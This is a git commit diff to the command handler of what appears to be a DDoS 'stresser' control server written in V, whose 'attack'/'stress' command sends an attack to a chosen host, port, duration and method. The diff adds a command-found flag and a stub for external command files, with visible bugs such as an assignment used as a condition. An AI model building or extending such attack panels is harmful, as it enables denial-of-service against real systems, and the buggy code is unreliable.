1eec5471b4131067493d1f893aa885fcf8de3337
x0tic0 <87556649+x0tic0@users.noreply.github.com>
2021-12-15 09:54:25 -0500

    Update cmd_handler.v

--- server/cmd_handler.v
+++ server/cmd_handler.v
@@ -48,6 +48,7 @@ pub fn cmd_handler(mut socket net.TcpConn, mut svr server.Server, mut c Current)
 		/*================================================================================*/
 
 		// Command Handling
+		mut command_found := false
 		mut data := reader.read_line() or { "" }
 		if data.len > 0 { // Dont do anything if the input doesnt have a character!
 			c.handle_cmd(data) // Configuring CurrentCmd Infomartion
@@ -58,18 +59,22 @@ pub fn cmd_handler(mut socket net.TcpConn, mut svr server.Server, mut c Current)
 			// Parse command here with a match statement
 			match c.cmd {
 				"home", "clear", "cls", "c" {
-
+					command_found = true
 				}
 				"passwd" {
+					command_found = true
 
 				}
 				"help" {
+					command_found = true
 
 				}
 				"methods" {
+					command_found = true
              		println("TEST METHODS")
 				}
 				"attack", "stress" {
+					command_found = true
              		if c.cmd_args.len > 3 {
 						 attack_system.attack(c.cmd_args[1], c.cmd_args[2], c.cmd_args[3], c.cmd_args[4])
 						 utils.place_text(mut socket, output_p[0].int(), output_p[1].int(), "Attack has been sent to: ${c.cmd_args[1]}:${c.cmd_args[2]} for ${c.cmd_args[3]}\r\n")
@@ -78,7 +83,11 @@ pub fn cmd_handler(mut socket net.TcpConn, mut svr server.Server, mut c Current)
 					}
 				} else {
 					time.sleep(500*time.millisecond)
-					utils.place_text(mut socket, output_p[0].int(), output_p[1].int(), "Command not found!\r\n")
+					check_command := file_external_command(mut &socket, mut &svr, mut &c);
+					if check_command == 1 { command_found = true }
+					if command_found = true {
+						utils.place_text(mut socket, output_p[0].int(), output_p[1].int(), "Command not found!\r\n")
+					}
 				}
 			}
 			println(data)
@@ -86,4 +95,20 @@ pub fn cmd_handler(mut socket net.TcpConn, mut svr server.Server, mut c Current)
 			utils.place_text(mut socket, cursor_p[0].int(), cursor_p[1].int(), "")
 		}
 	}
+}
+
+
+pub fn file_external_command(mut socket net.TcpConn, mut svr server.Server, mut c Current) int {
+	mut files := os.ls(os.getwd() + "/assets/commands/") or { [""] }
+	for i, file in files {
+		if file == ".scmd" {
+			return 1
+			server.operate_cmd(file, mut socket, mut &svr, mut &c)
+		}
+	}
+	return 0
+}
+
+pub fn operate_cmd(file string, mut socket net.TcpConn, mut svr server.Server, mut c Current) {
+
 }
